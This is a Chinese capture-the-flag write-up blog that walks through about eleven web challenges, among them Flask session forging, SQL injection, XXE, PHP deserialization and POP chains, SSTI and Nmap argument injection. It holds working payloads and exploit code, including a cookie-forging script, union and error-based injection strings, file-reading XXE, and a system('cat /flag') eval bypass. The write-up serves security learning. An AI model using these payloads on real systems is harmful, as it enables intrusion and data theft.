@[TOC]

# [HCTF 2018]admin
>参见大佬https://blog.csdn.net/weixin_44677409/article/details/100733581
## flask session

----------------------题目提示信息-------------------------
1. 随便注册登录，index页面`<--you are not admin-->`
2. 修改密码界面，`<--源码地址-->`

----------------------做题-------------------------

1. 查源码，`app/routes.py`显示了页面有的所有功能
2. `templates/index.html`显示了`session['name']==admin`就有flag
3. flask中session是存储在客户端cookie中，解密session内容

```python
#-------------session解密-------------------
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

4. 解密结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/935174dbc4d346208717a8b14e56849d.png)
5. >但是如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，然后我们在config.py里发现了SECRET_KEY 
![在这里插入图片描述](https://img-blog.csdnimg.cn/02bfa3d5b7e04bf0ba40401c4e39d967.png)

6. 替换`name`为`admin`进行加密
>https://github.com/noraj/flask-session-cookie-manager


```python
#-----------session加密---------

#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))


```

用法：



```s
加密
$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'e4fea746b619e757fef8eb6fe45b963d0c391cbef50f551d746e589714863a56eef2661b57eef7455fe5651527c7634198ab6bcca1b25110a506c920ef485e9f', 'csrf_token': b'4fcbfd4b9451d7076f3dc2872ecbd2a52066c106', 'image': b'UVrJ', 'name': 'admin', 'user_id': '10'}"


.eJw9kE2PgjAURf_K5K1Z2CobE3cgYdFHcAqkb2MYQGihToIaPoz_fRozcX3uPTfvPeF8GZtbB_v7-Gg8OOsa9k_4-oE9kDxZKsItBqTRhD7JiiGngUw3KEOWZMqU6bng6aRW4YsCNRWKiUgxlMce15STzHaJrGYMWpcLGdrc9WOO5qhR1oPLO3_GyGYMTTajjLdqrbhY0zmRXed2tOLYiSJeUIaziEImAjKJjCfX3SRBPiSFOsDLg-o2Xs733765fk7AiIyy1GMU-25mpqCacCUr-MkI026FzR1PFyWzRQSKqzWcsD28ddqWbfMx5Tkt3__kWloHoKytvoIHj1szvv8GbAOvP6-LbQI.YZz62Q.ZzGTTvS2bHfLIZhDxCR04tbEhqo
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4d270b459de6450182da57cbe0851058.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAU3ByaW50IzUxMjY0,size_20,color_FFFFFF,t_70,g_se,x_16)

========================================================

# [网鼎杯 2018]Fakebook

1. 登录之后view.php页面存在sql注入

2. 同时观察源码发现内容以data文件流写出

![在这里插入图片描述](https://img-blog.csdnimg.cn/dcf7394120634faa89d75a9e38b9dcf8.png)

3. payload

```s
view.php?no=1 and updatexml(1,concat('~',(select database()),'~'),1)#
view.php?no=1 and updatexml(1,concat('~',(select table_name from information_schema.columns where table_schema=database() limit 1,1),'~'),1)#
view.php?no=1 and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~'),1)#

# fakebook->users->username,passwd,data

view.php?no=1 and updatexml(1,concat('~',(select right(data,70) from users),'~'),1)#

# right($s,$x)中参数x从100缩小可以得到完整内容

#O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}

#这里的blog内容已经构造好了

最终

view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users#


```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f09c97fab4cc4a1d8b41702c31047ea0.png)
查看页面源码，base64解码得flag

========================================================

# [NCTF2019]Fake XML cookbook

>https://blog.csdn.net/qq_52907838/article/details/118030007

XXE
![在这里插入图片描述](https://img-blog.csdnimg.cn/cad901bfca084d3aa9d9bd61a2cb86ed.png)

抓包发现登录框可以HTML注入
```html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
  <!--file:///etc/passwd--><!--读目录-->
<user><username>&admin;</username><password>123456</password></user>

```
========================================================
# [安洵杯 2019]easy_serialize_php
-------------------------字符逃逸-----------------------------

>参见https://www.cnblogs.com/LLeaves/p/12813992.html

![在这里插入图片描述](https://img-blog.csdnimg.cn/45e55a046dac417ea09a527061e1aa70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAU3ByaW50IzUxMjY0,size_16,color_FFFFFF,t_70,g_se,x_16)
`extract:从数组中将变量导入到当前的符号表`

1. phpinfo页面关键信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/31d2d5488b14421aa935fae7ee86a9ae.png)
说明要读取d0g3_flag.php里面的内容，直接访问是访问不到的

分析一下源码:

```php
<?php

$function = @$_GET['f'];//传function

function filter($img){//过滤字符为空，字符逃逸关键点
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){//先清空SESSION为后面赋值开路
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
//SESSION当前只有两个键值对

extract($_POST);//从$_POST中提取键值对，变量覆盖关键点

if(!$function){//首页
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){//传值img_path或者不传设置SESSION['img']，没关系
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));//序列化之后

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

```

主要是三个关键点：

1. 构造反序列化字符逃逸
2. 绕过后面img的自动赋值
3. 用extract进行变量覆盖

其中:

1. 字符逃逸: 
		两种情况:
		1. 关键字过滤导致字符减少，"flag"->""，替换为空，这种情况用前一个键值吃掉(覆盖)后面的键值
		2. 关键字替换为更长的，"flag"->"fffff"，每替换一次逃逸出一个字符，所以直接在当前键值后面写序列化内容就行，也就是这道题用到的方法

2. 根据前辈博客

	```s
	<?php
	$str='a:2:{i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";}abc';
	var_dump(unserialize($str));
	>?
	=================================
	array(2) {
	 [0]=>
	 string(8) "Hed9eh0g"
	 [1]=>
	 string(5) "aaaaa"
	}
	```

	故反序列化在指定范围内进行，即使括号外有相同键赋值也不会影响反序列化过程，利用这一特性，可以利用变量覆盖user内容，构造function，user经过滤后吃掉function一部分内容，并提前结束反序列化范围，就能达到目的，下面上验证payload
	```php
	<?php
	
	session_start();
	unset($_SESSION);
	
	function filter($img){
	    $filter_arr = array('php','flag','php5','php4','fl1g');
	    $filter = '/'.implode('|',$filter_arr).'/i';
	    return preg_replace($filter,'',$img);
	}
	$_SESSION["user"] = 'flagflagflagflagflagflag';
	$_SESSION['function'] = 'a";s:3:"img";s:3:"yes";s:2:"aa";s:2:"bb";}';
	
	$_SESSION['img'] = base64_encode('guest_img.png');
	
	$b=serialize($_SESSION);
	
	echo $b;
	
	$c=filter($b);
	
	var_dump(unserialize($c));

	```
	
3. 具体化到题目中就是payload
	`GET： ?f=show_image`
	`POST: _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:2:"bb";}`
	
	![在这里插入图片描述](https://img-blog.csdnimg.cn/e0a4c212dc714cd88cb2706548e7e5b3.png)
替换base64值为该文件的就能得到flag

也可以用键逃逸
	
	payload:_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
	a:1:{s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";}

# [CISCN 2019 初赛]Love Math

>[学习链接](https://www.cnblogs.com/shenjuxian/p/13886353.html)

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}

```
题目要求：
1.长度不能超80
2.所用函数在白名单

用到函数：
1.base_convert( string $number, int $frombase, int $tobase) 函数：在任意进制之间转换数字。
2.dechex() 函数：把十进制转换为十六进制。
3.hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。

该题用PHP动态变量特性，使用变量，拼接函数名以及函数中内容

吸收知识点：
`因为中括号、引号被过滤了，可以用大括号代替`

利用`36`进制可以得出任意小写字母，用它构造`hex2bin`
```shell
#十进制形式的37907361743转换回36进制是hex2bin
base_convert(37907361743,10,36)
```

`_GET`有大写要求,转换成十六进制，`5f474554`

疑惑：最终payload为什么不能直接放十六进制数，为什么要用十进制转十六进制转

payload:`?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag`


# [WesternCTF2018]shrine 
>[参考1](https://www.cnblogs.com/l0y0h/articles/15774308.html)
>[参考2](http://www.manongjc.com/detail/26-exggzlgbipyccoy.html)

对模板注入这有点不太明白，先按着走吧
展现的有点不规则

1.ctrl+U看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/383de5c6e7b84a1db1d6682936d74b77.png)
测试:`url+/shine/{{8*8}}`，返回64，存在ssti

>注册了一个名为FLAG的config，猜测flag在此config中，若不存在过滤，可以使用{undefined{config}}查看app.config中的内容

>在这要用到python的内置函数：url_for 和 get_flashed_messages
payload:`/shine/{{url_for.__globals__}}`

![在这里插入图片描述](https://img-blog.csdnimg.cn/8ade52c54ffe49eab0ec4a96c70cef18.png)
`/shine/{{url_for.__globals__['current_app'].config}}`

# [网鼎杯 2020 朱雀组]Nmap
>https://zhuanlan.zhihu.com/p/145906109

![在这里插入图片描述](https://img-blog.csdnimg.cn/0da4695e8a9043d69fe4324debe9550e.png)
展现出来的好像是nmap功能，alt+u

![在这里插入图片描述](https://img-blog.csdnimg.cn/57663c5345df41179e5041c1874c6b0b.png)
提示flag在/flag

点下面那个按钮下面能看结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/2051f50c479f408d84ae25883ec58e5d.png)
点文件名能看详细信息，进去后看到他的url能传参,想着传flag文件名，显示错误页面

想能不能直接查`<?php @eval($_GET[1]);?>`，发现有防护机制

![在这里插入图片描述](https://img-blog.csdnimg.cn/5899677f982d41c5a3b3c639ecc94784.png)
应该有关键词过滤,用短标签发现host maybe down

发现扫描ip之后都会将内容打出来，尝试能不能用nmap从`/flag`读取内容打印

`-iL /flag -oN 1.txt`

说something went wrong

学习了知乎文章之后才发现这里面还考了两个函数

`escapeshellarg()`和`escapeshellcmd()`

`escapeshellarg()`将对整个字符串以单引号括住,并且将已经有的单引号转义再用反斜杠转义
![在这里插入图片描述](https://img-blog.csdnimg.cn/a5f94f06640b49768286db4724ba59a8.png)

`escapeshellcmd()`对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。(如果是单个单引号出现，就将他转义，成对的没有危险)

```shell
127.0.0.1' -iL /flag -oN 1.txt '
'127.0.0.1'\'' -iL /flag -oN 1.txt '\'''
'127.0.0.1'\\'' -iL /flag -oN 1.txt '\\'''
```

这个文件名和最后的单引号之间必须有个空格

>具体原因没有搞明白...
>
![在这里插入图片描述](https://img-blog.csdnimg.cn/bf2986399ec14c81b03abf3939db4679.png)

# [MRCTF2020]Ezpop

用到的函数：
```php
__invoke() 将对象当作函数来使用的时候，会自动调用该方法
__toString()当对象被当做一个字符串使用时调用。
__get():在调用私有属性的时候会自动执行
__wakeup():将在反序列化之后立即被调用，反序列化恢复对象之前调用该方法
__construct(): 在创建对象时候初始化对象，一般用于对变量赋初值。

```

观察源码:
```php
传一个pop参数，对其进行反序列化

如果pop是一个Show类，执行__wakeup()

wakeup()中preg_match()将$this->source当作字符串比较,如果$this->source是Show类，就会触发__toString()

to_String()中有$str，如果$str是一个Test类，调用其没有的$source就会触发函数__get()

__get()返回以$p为名的函数，如果$p为实例化Modifier类，将其以函数形式调用，就会触发其中函数__invoke()

__invoke()函数调用append()，有include()，存在文件包含漏洞

利用文件包含漏洞读取flag.php
```

构造：

```php
<?php

class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';

}

class Show{
    public $source;
    public $str;
		public function __construct($file='index.php'){
        $this->source = $file;
    }
}


class Test{
    public $p;
}

$a=new Show('asd');
$a->str=new Test();
$a->str->p=new Modifier();
$b=new Show($a);

echo urlencode(serialize($b));

#O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22asd%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```
记得带构造函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/1f7a0bc72bb545f08279a5325cac34e9.png)


# [SWPU2019]Web1

首页注入的话会提示登陆失败的，直接注册用户登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/77287caa13e247eeb9a1495b8551f100.png)
申请文章的时候尝试注入
![在这里插入图片描述](https://img-blog.csdnimg.cn/3db82f5ce5f149778d9db821678ee836.png)
分别写了`admin'`和`root'`，发现广告名可以注入，显示使用的是'MariaDB'

or被过滤了，测列数用`group by`，注释符也不能用，其他师傅的博客都用了`逗号+引号`的方式闭合，不知道是什么原理，有知道的师傅可以解释一下吗？

`-1'/**/group/**/by/**/22,'`测到22列
![在这里插入图片描述](https://img-blog.csdnimg.cn/e951c7c9c9294df58dfe9b9573ba9c07.png)

显示列是`2,3`
MariaDB结构：
`https://mariadb.com/kb/en/mysqlinnodb_table_stats/`

利用`mysql.innodb_table_stats`查具体信息`database_name|table_name`
![在这里插入图片描述](https://img-blog.csdnimg.cn/b0c1704efd194938ae80398828a3d446.png)


查数据库名：
`-1'/**/union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`

![在这里插入图片描述](https://img-blog.csdnimg.cn/22bbd56a21354c79ae65a116aa1211c8.png)
查表名：
`-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`

![在这里插入图片描述](https://img-blog.csdnimg.cn/b93961f323044270a35c189e65cf895f.png)

判断`users`列数：
`-1'/**/union/**/select/**/1,(select/**/*/**/from/**/users/**/group/**/by/**/4),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`

测出来是4列，接下来无列名注入

`-1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`

![在这里插入图片描述](https://img-blog.csdnimg.cn/41810d234c884ecc847e3773be1941c3.png)
换成b列应该就能看到了
![在这里插入图片描述](https://img-blog.csdnimg.cn/6a78c687e4134833b0bb2be0d35faf1e.png)
# [NPUCTF2020]ReadlezPHP

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a4e3918e4b94c85a5de4b3dcbe99521.png)
ctrl+U看源码

![在这里插入图片描述](https://img-blog.csdnimg.cn/8fbb69417c484063b92ebce4981ba285.png)
发现有`time.php`这个页面且带参数`source`,访问之

![在这里插入图片描述](https://img-blog.csdnimg.cn/6931d6603d21451a9e2bfdb3431972af.png)
发现HelloPhp类的解构函数有个函数拼接

```php
<?php

class HelloPhp
{
    public $a='ls';
    public $b='system';
}

$a=new HelloPhp;

echo urlencode(serialize($a));


```

没有回显，可能是过滤了

常见的函数执行:

```php
* `eval`
* `preg_replace+/e`
* `assert`
* `call_user_func($参数，$函数)`

    `call_user_func_array()`

* `create_function($参数，$函数)`

```

用assert执行phpinfo,搜索flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/88b52a5255764585a05e4ee1ca07d45b.png)

# [MRCTF2020]PYWebsite

![在这里插入图片描述](https://img-blog.csdnimg.cn/73e0369cdab642859a209e73b4c99849.png)
这个题看起来就很像买彩票那个，大家应该知道，或者买独角兽那道

![在这里插入图片描述](https://img-blog.csdnimg.cn/369fbeb4115440ac98bd95f1c6b59f72.png)
进来震惊了，二维码好家伙，哈哈哈哈哈，好奇扫了一下发现并不是

老样子，ctrl+U

没什么内容，返回主页，源码

![在这里插入图片描述](https://img-blog.csdnimg.cn/e481a4baefde48fcbf4cbfc476894e10.png)
发现这么一段
访问一下`flag.php`

![在这里插入图片描述](https://img-blog.csdnimg.cn/9bb001c0809b4a06b19187342984709e.png)
看起来要改XFF头验证来源的

直接改成127.0.0.1就可以了


# PS

这11道拖了很久才回来继续写，最近抽时间赶一赶，刷！
